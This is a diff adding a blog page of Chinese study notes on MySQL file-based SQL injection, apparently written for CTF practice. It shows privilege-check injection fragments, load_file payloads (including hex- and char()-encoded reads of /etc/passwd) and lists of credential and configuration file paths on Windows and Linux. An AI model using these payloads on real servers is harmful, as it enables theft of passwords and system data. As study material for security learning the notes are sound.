@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件型注入 - Ting BLOG🐈</title><meta name="author" content="Ting">
+<meta name="description" content=" 本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187
+一、基本思路1.通过使用load_file导出访问dnslog平台； 2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号； 【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】
+"><meta name="keywords" content='Web, CTF'>
+  <meta itemprop="name" content="文件型注入">
+  <meta itemprop="description" content="本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187
+一、基本思路1.通过使用load_file导出访问dnslog平台； 2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号； 【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】">
+  <meta itemprop="datePublished" content="2023-07-01T11:25:40+08:00">
+  <meta itemprop="dateModified" content="2023-07-01T11:25:40+08:00">
+  <meta itemprop="wordCount" content="274">
+  <meta itemprop="keywords" content="Web,CTF"><meta property="og:url" content="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/">
+  <meta property="og:site_name" content="Ting BLOG🐈">
+  <meta property="og:title" content="文件型注入">
+  <meta property="og:description" content="本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187
+一、基本思路1.通过使用load_file导出访问dnslog平台； 2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号； 【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-07-01T11:25:40+08:00">
+    <meta property="article:modified_time" content="2023-07-01T11:25:40+08:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="CTF">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件型注入">
+  <meta name="twitter:description" content="本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187
+一、基本思路1.通过使用load_file导出访问dnslog平台； 2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号； 【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/" title="文件型注入 - Ting BLOG🐈" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2023web-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="日志包含漏洞" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/" title="文件上传绕过" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/index.md" title="文件型注入 - Ting BLOG🐈"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件型注入",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5\/"
+    },"genre": "posts","keywords": "Web, CTF","wordcount":  274 ,
+    "url": "http:\/\/localhost:1313\/posts\/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5\/","datePublished": "2023-07-01T11:25:40+08:00","dateModified": "2023-07-01T11:25:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Ting"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>文件型注入</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2023%E7%AC%94%E8%AE%B0%E6%9C%AA%E6%95%B4%E7%90%86/" class="post-category" title="Category - Web · 2023笔记（未整理）"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2023笔记（未整理）</a></span></div><div class="post-meta-line"><span title="published on 2023-07-01 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-07-01">2023-07-01</time></span>&nbsp;<span title="274 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一基本思路">一、基本思路</a></li>
+    <li><a href="#二基础函数">二、基础函数</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187</p>
+</blockquote>
+<h2 id="一基本思路" class="heading-element"><span>一、基本思路</span>
+  <a href="#%e4%b8%80%e5%9f%ba%e6%9c%ac%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1.通过使用load_file导出访问dnslog平台；
+2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号；
+【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】</p>
+<h2 id="二基础函数" class="heading-element"><span>二、基础函数</span>
+  <a href="#%e4%ba%8c%e5%9f%ba%e7%a1%80%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1.<strong>load_file(file_name)</strong>:读取文件并返回该文件的内容作为一个字符串。【相当于导出文件】
+使用条件：
+（1）文件必须有读写的权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。
+</span></span><span class="line"><span class="cl">and (select count() from mysql.user)&gt;0/ 返回错误，应该是管理员给数据库帐户降权</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（2）读取的文件在服务器上
+（3）待读取文件大小要小于 max_allowed_packet</p>
+<p>MySQL注入load_file常用路径
+（1）Windows下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> c:/boot.ini 										//查看系统版本
+</span></span><span class="line"><span class="cl"> c:/windows/php.ini 									//php配置信息
+</span></span><span class="line"><span class="cl"> c:/windows/my.ini 									//MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
+</span></span><span class="line"><span class="cl"> c:/winnt/php.ini
+</span></span><span class="line"><span class="cl"> c:/winnt/my.ini
+</span></span><span class="line"><span class="cl"> c:\mysql\data\mysql\user.MYD 						//存储了mysql.user表中的数据库连接密码
+</span></span><span class="line"><span class="cl"> c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini	//存储了虚拟主机网站路径和密码
+</span></span><span class="line"><span class="cl"> c:\Program Files\Serv-U\ServUDaemon.ini
+</span></span><span class="line"><span class="cl"> c:\windows\system32\inetsrv\MetaBase.xml			//查看IIS的虚拟主机配置
+</span></span><span class="line"><span class="cl"> c:\windows\repair\sam								//存储了WINDOWS系统初次安装的密码
+</span></span><span class="line"><span class="cl"> c:\Program Files\ Serv-U\ServUAdmin.exe				//6.0版本以前的serv-u管理员密码存储于此
+</span></span><span class="line"><span class="cl"> c:\Program Files\RhinoSoft.com\ServUDaemon.exe		
+</span></span><span class="line"><span class="cl"> C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件											//存储了pcAnywhere的登陆密码
+</span></span><span class="line"><span class="cl"> c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf											//查看WINDOWS系统apache文件
+</span></span><span class="line"><span class="cl"> c:/Resin-3.0.14/conf/resin.conf						//查看jsp开发的网站 resin												//文件配置信息.
+</span></span><span class="line"><span class="cl"> c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf	//查看linux系统配置的JSP虚拟主机
+</span></span><span class="line"><span class="cl"> d:\APACHE\Apache2\conf\httpd.conf
+</span></span><span class="line"><span class="cl"> C:\Program Files\mysql\my.ini
+</span></span><span class="line"><span class="cl"> C:\mysql\data\mysql\user.MYD						//存在MYSQL系统中的用户密码</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（2）Linux下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> 				<span class="o">//</span><span class="n">apache2缺省配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhosts</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span><span class="err">虚拟网站设置</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">.</span><span class="n">ini</span> 					<span class="o">//</span><span class="n">PHP相关设置</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">iptables</span> 							<span class="o">//</span><span class="err">从中得到防火墙规则策略</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> 							<span class="o">//</span> <span class="n">apache配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rsyncd</span><span class="o">.</span><span class="n">conf</span> 									<span class="o">//</span><span class="err">同步程序配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">my</span><span class="o">.</span><span class="n">cnf</span> 										<span class="o">//</span><span class="n">mysql的配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">redhat</span><span class="o">-</span><span class="n">release</span>									<span class="o">//</span><span class="err">系统版本</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span><span class="o">.</span><span class="n">net</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">.</span><span class="n">ini</span> 					<span class="o">//</span><span class="n">PHP相关设置</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhosts</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span><span class="err">虚拟网站设置</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf或</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apche</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span><span class="err">查看</span><span class="n">linux</span> <span class="n">APACHE虚拟主机配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">resin</span><span class="o">-</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">resin</span><span class="o">.</span><span class="n">conf</span> 				<span class="o">//</span><span class="err">针对</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="err">的</span><span class="n">RESIN配置文件查看</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">resin</span><span class="o">-</span><span class="n">pro</span><span class="o">-</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">resin</span><span class="o">.</span><span class="n">conf</span> 			<span class="o">//</span><span class="err">针对</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="err">的</span><span class="n">RESIN配置文件查看</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhosts</span><span class="o">.</span><span class="n">conf</span> 	<span class="o">//</span><span class="n">APASHE虚拟主机查看</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf或</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apche</span><span class="o">/</span><span class="n">conf</span> <span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span><span class="err">查看</span><span class="n">linux</span> <span class="n">APACHE虚拟主机配置文件</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">resin</span><span class="o">-</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">resin</span><span class="o">.</span><span class="n">conf</span> 				<span class="o">//</span><span class="err">针对</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="err">的</span><span class="n">RESIN配置文件查看</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">resin</span><span class="o">-</span><span class="n">pro</span><span class="o">-</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">22</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">resin</span><span class="o">.</span><span class="n">conf</span> <span class="err">同上</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhosts</span><span class="o">.</span><span class="n">conf</span>	<span class="o">//</span><span class="n">APASHE虚拟主机查看</span>
+</span></span><span class="line"><span class="cl"> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">iptables</span>								<span class="o">//</span><span class="err">查看防火墙策略</span>
+</span></span><span class="line"><span class="cl"> <span class="n">load_file</span><span class="p">(</span><span class="n">char</span><span class="p">(</span><span class="mi">47</span><span class="p">))</span>									<span class="o">//</span><span class="err">可以列出</span><span class="n">FreeBSD</span><span class="p">,</span><span class="n">Sunos系统根目录</span>
+</span></span><span class="line"><span class="cl"> <span class="n">replace</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="err">×</span><span class="mi">2</span><span class="n">F6574632F706173737764</span><span class="p">),</span><span class="mi">0</span><span class="err">×</span><span class="mi">3</span><span class="n">c</span><span class="p">,</span><span class="mi">0</span><span class="err">×</span><span class="mi">20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">replace</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="n">char</span><span class="p">(</span><span class="mi">47</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">100</span><span class="p">)),</span><span class="n">char</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span><span class="n">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.<strong>LOAD DATA INFILE</strong> ：高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。【相当于把文件导入数据库】
+例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">data</span> <span class="n">infile</span> <span class="err">‘</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t0</span><span class="o">.</span><span class="n">txt</span><span class="err">’</span> <span class="n">ignore</span> <span class="n">into</span> <span class="n">table</span> <span class="n">t0</span> <span class="n">character</span> <span class="n">set</span> <span class="n">gbk</span> <span class="n">fields</span> <span class="n">terminated</span> <span class="n">by</span> <span class="s1">&#39;</span><span class="se">\t</span><span class="s1">’lines terminated by ‘</span><span class="se">\n</span><span class="s1">’</span></span></span></code></pre></td></tr></table>
+</div>
